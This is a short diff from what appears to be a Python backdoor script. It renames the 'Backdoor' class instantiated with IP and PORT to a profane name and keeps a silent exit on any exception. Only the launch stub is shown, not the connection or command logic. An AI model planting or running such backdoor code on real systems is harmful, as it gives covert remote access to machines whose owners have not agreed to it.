@@ -82,7 +82,7 @@ def get_status():
 
 
 try:
-    jja213415 = Backdoor(IP, PORT)
+    jja213415 = MotherFucker(IP, PORT)
     jja213415.run()
 except Exception:
     sys.exit()
